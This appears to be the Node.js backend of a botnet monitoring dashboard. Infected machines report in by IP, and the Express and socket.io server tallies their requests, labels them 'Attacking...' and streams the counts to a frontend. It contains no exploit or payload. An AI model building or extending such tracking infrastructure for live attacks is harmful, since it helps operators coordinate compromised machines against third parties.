const express = require("express");
const cors = require("cors");
const path = require("path");
const http = require("http");

require("dotenv/config");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(
  express.urlencoded({
    extended: false,
  })
);
app.use(express.json());

const server = http.createServer(app);
const io = require("socket.io")(server, {
  cors: {
    origin: "*",
  },
});

// Import Routes
let numberOfRequests = 0;
let bots = [];

const exists = (ip) =>
  bots.filter((b) => b.ip === ip).length > 0 ? true : false;

const incrementCounter = (ip) => {
  bots = bots.map((bot, i) => {
    if (bot.ip === ip) bot.nRequest += 1;
    return bot;
  });
};

app.get("/:ip", (req, res) => {
  if (req.params.ip) {
    if (!exists(req.params.ip)) {
      bots.push({
        id: bots.length + 1,
        ip: req.params.ip,
        nRequest: 0,
        status: "Attacking...",
      });
    }
    incrementCounter(req.params.ip);
  } else {
    res.status(400).json({ message: "Include ip address of infected machine" });
    return;
  }

  numberOfRequests += 1;
  res.status(200).json({ msg: "Updated counter" });
});

const CHECK_STATUS_EVENT = "checkStatusEvent";
io.on("connection", (socket) => {
  setInterval(() => {
    io.emit(CHECK_STATUS_EVENT, {
      nRequest: numberOfRequests,
      bots,
    });
  }, 1000);
});

// Serve static assets if in production
//if (process.env.NODE_ENV === "production") {
// Set static folder
app.use(express.static("./frontend/build"));
app.get("*", (req, res) => {
  res.sendFile(path.resolve(__dirname, "frontend", "build", "index.html"));
});
//}

// Server Init
server.listen(PORT, () => {
  console.log(`Listening on port ${PORT}`);
});

//app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
